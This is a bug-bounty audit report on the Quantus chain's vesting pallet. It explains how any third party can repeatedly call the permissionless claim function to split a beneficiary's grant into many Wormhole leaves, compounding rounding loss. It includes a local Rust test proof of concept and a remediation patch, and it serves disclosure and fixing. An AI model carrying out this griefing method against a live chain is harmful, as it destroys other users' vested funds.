# 88671 bc medium permissionless vesting claim forces payout fragmentation leading to loss of beneficiary funds

**Submitted on Aug 14th 2026 at 12:57:06 UTC by @zealynx for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88671
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

`Vesting::claim` is permissionless and pays the largest amount vested at call time. Every payout becomes a separate Wormhole leaf, and each leaf independently loses value to circuit rounding. An unrelated account can therefore call `claim` once per permitted interval to fragment a beneficiary's grant into many small leaves, multiplying the rounding loss. The beneficiary permanently receives less than their grant, the loss is irreversible, and the attacker needs nothing but transaction fees and no relationship to the schedule.

### Vulnerability Details

`Vesting::claim` calls `ensure_signed(origin)` and deliberately permits any signer to claim any schedule. `claim_plan` then pays the largest amount vested at that moment.

Every payout becomes a separate Wormhole leaf quantized to 0.01 QUAN. A Wormhole leaf must satisfy:

```
(output * 10_000) <= (input * 9_996)
```

Rounding occurs **independently for every leaf**. Fragmenting one payout into many therefore multiplies the rounding loss rather than amortising it.

Aggregation cannot recover it. The inequality is enforced inside each leaf circuit *before* private-batch aggregation. The batch circuit may group identical exit accounts and sum their outputs, but it only ever sums outputs that already satisfied the per-leaf inequality — so batching fragmented leaves cannot restore what each leaf already rounded away.

Because the claim is permissionless, the choice of fragmentation belongs to **the attacker, not the beneficiary**. The one-day `MinClaimInterval` sets the maximum fragmentation rate but does nothing to prevent it: for a linear 365-day, 365-QUAN schedule an attacker calls once per day and forces 365 one-QUAN leaves, each able to output at most 0.99 QUAN. Claimed once at completion, the same grant is a single leaf able to output 364.85 QUAN.

**Vulnerable scenario:**

{% stepper %}
{% step %}

## A beneficiary has a 365-day linear grant of 365 QUAN

{% endstep %}

{% step %}

## An unrelated signed account calls `Vesting::claim(schedule_id)` after every 24-hour interval

{% endstep %}

{% step %}

## The pallet records 365 leaves of 1 QUAN instead of one leaf of 365 QUAN

{% endstep %}

{% step %}

## Independent per-leaf rounding reduces the combined maximum output from 364.85 to 361.35 QUAN

{% endstep %}
{% endstepper %}

#### Attacker authority

Only an arbitrary funded account able to submit a signed extrinsic. The caller need not be the beneficiary, schedule creator, treasury, administrator, or a governance member. The `RuntimeOrigin::root()` calls in the PoC construct identical legitimate victim schedules as test fixtures only — every harmful daily claim is submitted by unrelated `account(8)`.

#### Relationship to the other permissionless-claim finding

This shares only its precondition — `Vesting::claim` accepting any signer — with the separate report on blocked schedule termination. They are distinct vulnerabilities with different victims, mechanisms and fixes, and neither fix resolves the other:

|                | This report                                                                               | The termination report                               |
| -------------- | ----------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| Victim         | the beneficiary                                                                           | the treasury                                         |
| Mechanism      | repeated claims fragment the grant into many Wormhole leaves; per-leaf rounding compounds | a single claim leaves a sub-minimum vested remainder |
| Attacker calls | once per interval, repeatedly                                                             | exactly once, at a chosen vesting point              |
| Loss           | \~3.50 QUAN of a 365-QUAN grant, destroyed                                                | < 1 `MinimumPayout`, denied to the treasury          |
| Fix            | constrain who may claim, or amortise leaf rounding                                        | correct the `claim_plan` non-final cap               |

Capping `claim_plan` (the other report's fix) does not prevent fragmentation; constraining the caller here does not repair the dust remainder that blocks termination.

### Impact Details

Irreversible loss of a beneficiary's vested funds, inflicted by any third party.

* **Amount at risk:** an additional **3.50 QUAN** destroyed on a 365-QUAN grant — the maximum withdrawable falls from 364.85 QUAN to 361.35 QUAN. The loss scales with the number of forced fragments, i.e. with schedule duration.
* **Who bears the loss:** the beneficiary. The funds are not transferred to the attacker; they become permanently unwithdrawable through the Wormhole exit path.
* **Reversibility:** none. Each leaf's rounding is fixed at the moment the payout is recorded, and aggregation provably cannot recover it.
* **Attacker prerequisites:** a funded account and transaction fees. No control over the schedule, the beneficiary, or any privileged origin.
* **Profit motive:** none — this is griefing. The attacker pays fees to destroy another user's funds, which is why it is filed as Medium rather than higher.

## References

Frozen revision: `quantus-chain@3b243b870a5442a6e5f443056f67bbba87d472f5`

* `pallets/vesting/src/lib.rs#L319-L350` — `claim`, `ensure_signed` with the result discarded
* `pallets/vesting/src/lib.rs#L530-L559` — `claim_plan`, pays the largest currently-vested amount
* `runtime/src/configs/mod.rs#L562-L571` — `VestingMinClaimInterval`, `VestingPayoutQuantum`, `VestingMinimumPayout`
* Wormhole leaf fee inequality `(output * 10_000) <= (input * 9_996)`, enforced per leaf in the withdrawal circuit before private-batch aggregation

## Proof of Concept

### Environment

Runs entirely locally. **No test was performed against mainnet or any public testnet.**

Requires a Rust toolchain matching the repository's `rust-toolchain` and `SKIP_WASM_BUILD=1` (native-only test build). The test is added to the existing `runtime/tests/governance/vesting.rs`, which already supplies the `account()`, `signers()`, `treasury_multisig()` and `new_test_ext()` helpers it uses. No RPC endpoint, no fork, no external service.

Use frozen chain commit `3b243b870a5442a6e5f443056f67bbba87d472f5`. Save and apply this patch from the repository root:

```diff
diff --git a/runtime/tests/governance/vesting.rs b/runtime/tests/governance/vesting.rs
--- a/runtime/tests/governance/vesting.rs
+++ b/runtime/tests/governance/vesting.rs
@@ -56,6 +56,22 @@ mod tests {
 		pallet_timestamp::Now::<Runtime>::put(now_ms);
 	}
 
+	fn max_exitable_from_recorded_leaves(beneficiary: &AccountId) -> (usize, Balance) {
+		let quantum = VestingPayoutQuantum::get();
+		let fee_bps = VolumeFeeRateBps::get() as u128;
+		let leaves: Vec<_> = pallet_zk_tree::Leaves::<Runtime>::iter_values()
+			.filter(|leaf| &leaf.to == beneficiary)
+			.collect();
+		let max_exit = leaves
+			.iter()
+			.map(|leaf| {
+				let input_quanta = leaf.amount / quantum;
+				input_quanta * (10_000 - fee_bps) / 10_000 * quantum
+			})
+			.sum();
+		(leaves.len(), max_exit)
+	}
+
 	fn propose_approve_execute(call: RuntimeCall, proposal_id: u32) {
 		let treasury = treasury_multisig();
 		let encoded: BoundedCallOf<Runtime> = call.encode().try_into().unwrap();
@@ -264,6 +280,62 @@ mod tests {
 		});
 	}
 
+	#[test]
+	fn audit_permissionless_daily_claims_amplify_wormhole_rounding_loss() {
+		const DAY: u64 = 24 * 60 * 60 * 1000;
+		const DAYS: u64 = 365;
+		const TOTAL: Balance = DAYS as Balance * UNIT;
+		let beneficiary = account(9);
+
+		let (fragmented_leaves, fragmented_max_exit) =
+			new_test_ext(Some(account(4))).execute_with(|| {
+				Balances::make_free_balance_be(&account(4), 1000 * UNIT);
+				assert_ok!(Vesting::create_schedule(
+					RuntimeOrigin::root(),
+					beneficiary.clone(),
+					0,
+					0,
+					DAYS * DAY,
+					TOTAL,
+				));
+				for day in 1..=DAYS {
+					set_time(day * DAY);
+					assert_ok!(Vesting::claim(RuntimeOrigin::signed(account(8)), 0));
+				}
+				assert_eq!(
+					pallet_vesting::Schedules::<Runtime>::get(0).unwrap().claimed,
+					TOTAL
+				);
+				max_exitable_from_recorded_leaves(&beneficiary)
+			});
+
+		let (single_leaves, single_max_exit) =
+			new_test_ext(Some(account(4))).execute_with(|| {
+				Balances::make_free_balance_be(&account(4), 1000 * UNIT);
+				assert_ok!(Vesting::create_schedule(
+					RuntimeOrigin::root(),
+					beneficiary.clone(),
+					0,
+					0,
+					DAYS * DAY,
+					TOTAL,
+				));
+				set_time(DAYS * DAY);
+				assert_ok!(Vesting::claim(RuntimeOrigin::signed(account(8)), 0));
+				max_exitable_from_recorded_leaves(&beneficiary)
+			});
+
+		assert_eq!(fragmented_leaves, 365);
+		assert_eq!(single_leaves, 1);
+		assert_eq!(fragmented_max_exit, 36_135 * VestingPayoutQuantum::get());
+		assert_eq!(single_max_exit, 36_485 * VestingPayoutQuantum::get());
+		assert_eq!(
+			single_max_exit - fragmented_max_exit,
+			350 * VestingPayoutQuantum::get(),
+			"third-party fragmentation must irreversibly reduce beneficiary value"
+		);
+	}
+
 	#[test]
 	fn scheduler_enacted_root_end_schedule_records_the_payout_leaf() {
 		use frame_support::traits::{
```

```bash
git apply /tmp/vesting-fee-fragmentation-poc.patch
SKIP_WASM_BUILD=1 cargo test -p quantus-runtime --test mod \
  governance::vesting::tests::audit_permissionless_daily_claims_amplify_wormhole_rounding_loss \
  -- --nocapture
```

The test uses the production runtime configuration, records actual ZK-tree leaves, and compares identical schedules whose only difference is the unrelated caller's claim cadence. `RuntimeOrigin::root()` only establishes the victim's legitimate pre-existing vesting schedule; the attack itself is every `Vesting::claim(RuntimeOrigin::signed(account(8)), 0)` call, made by an unrelated ordinary account with no administrative or treasury authority.

Observed output:

```
test governance::vesting::tests::audit_permissionless_daily_claims_amplify_wormhole_rounding_loss ... ok
test result: ok. 1 passed; 0 failed
```

Baseline:

```bash
SKIP_WASM_BUILD=1 cargo test -p quantus-runtime --test mod governance::vesting::tests -- --nocapture
```

```
test result: ok. 7 passed; 0 failed
```

After applying the recommendation below, the unchanged harm-mode PoC fails at the first daily claim with `NothingToClaim`. A positive sweep comparing periodic and final-only claims for seven schedule shapes produced identical maximum outputs in every case. The complete runtime Vesting suite passed 7/7 and `cargo test -p pallet-vesting` passed 58/58.

## Recommendations

Quantize every non-final payout to the smallest multiple of `PayoutQuantum` whose Wormhole fee is an exact number of leaf quanta, while preserving an exact final payout for the remainder. At 4 bps and a 0.01-QUAN leaf quantum, that alignment is 2,500 leaf quanta, or 25 QUAN.

The core of the verified remediation is:

```diff
diff --git a/pallets/vesting/src/lib.rs b/pallets/vesting/src/lib.rs
--- a/pallets/vesting/src/lib.rs
+++ b/pallets/vesting/src/lib.rs
@@ -151,4 +151,10 @@ pub mod pallet {
 		#[pallet::constant]
 		type PayoutQuantum: Get<BalanceOf<Self>>;
 
+		/// Alignment for non-final payouts. This should be the smallest multiple of
+		/// `PayoutQuantum` for which the Wormhole volume fee is an exact whole number
+		/// of leaf quanta.
+		#[pallet::constant]
+		type NonFinalPayoutQuantum: Get<BalanceOf<Self>>;
+
 		/// Smallest beneficiary payout. Must be quantum-aligned, at least two quanta,
@@ -548,5 +554,12 @@ pub mod pallet {
 				if max_non_final < minimum {
 					return Ok(ClaimPlan::WouldLeaveDust);
 				}
-				candidate.min(max_non_final)
+				let payable = Self::quantize_down_to(
+					candidate.min(max_non_final),
+					T::NonFinalPayoutQuantum::get(),
+				);
+				if payable < minimum {
+					return Ok(ClaimPlan::NothingToClaim);
+				}
+				payable
 			};
@@ -561,6 +574,10 @@ pub mod pallet {
 
 		/// Round down to a multiple of the payout quantum.
 		fn quantize_down(amount: BalanceOf<T>) -> BalanceOf<T> {
-			let remainder = amount % T::PayoutQuantum::get();
+			Self::quantize_down_to(amount, T::PayoutQuantum::get())
+		}
+
+		fn quantize_down_to(amount: BalanceOf<T>, quantum: BalanceOf<T>) -> BalanceOf<T> {
+			let remainder = amount % quantum;
 			amount.checked_sub(&remainder).expect("remainder never exceeds the dividend")
 		}
diff --git a/runtime/src/configs/mod.rs b/runtime/src/configs/mod.rs
--- a/runtime/src/configs/mod.rs
+++ b/runtime/src/configs/mod.rs
@@ -567,3 +567,4 @@ parameter_types! {
 	pub const VestingPayoutQuantum: Balance = pallet_wormhole::SCALE_DOWN_FACTOR;
+	pub const VestingNonFinalPayoutQuantum: Balance = 25 * UNIT;
 	/// One QUAN keeps every payout above the existential deposit and the Wormhole
 	/// circuit's fee-consuming minimum.
@@ -636,3 +637,4 @@ impl pallet_vesting::Config for Runtime {
 	type ProofRecorder = Wormhole;
 	type PayoutQuantum = VestingPayoutQuantum;
+	type NonFinalPayoutQuantum = VestingNonFinalPayoutQuantum;
 	type MinimumPayout = VestingMinimumPayout;
```
